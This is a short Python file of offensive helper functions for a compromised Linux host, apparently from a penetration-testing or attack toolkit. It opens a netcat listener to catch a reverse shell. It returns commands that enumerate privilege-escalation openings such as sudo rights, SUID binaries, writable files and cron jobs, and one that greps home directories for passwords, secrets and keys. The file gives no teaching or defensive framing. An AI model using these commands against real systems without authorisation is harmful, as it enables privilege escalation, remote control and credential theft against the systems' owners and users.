import subprocess

def open_terminal_with_command(command):
    try:
        subprocess.call(['gnome-terminal', '--', 'bash', '-c', f'{command}; exec bash'])
    except Exception as e:
        print(f"Failed to open terminal: {e}")

def reverse_shell_listener(port):
    open_terminal_with_command(f"nc -lvnp {port}")

def check_sudo_permissions():
    return "sudo -l"

def find_suid_binaries():
    return "find / -perm -4000 -type f 2>/dev/null"

def get_kernel_version():
    return "uname -r"

def find_writable_files():
    return "find / -writable -type f 2>/dev/null"

def check_cron_jobs():
    return "cat /etc/crontab; ls -l /etc/cron*"

def search_for_credentials():
    return "grep -ri 'password\\|passwd\\|secret\\|key' /home 2>/dev/null"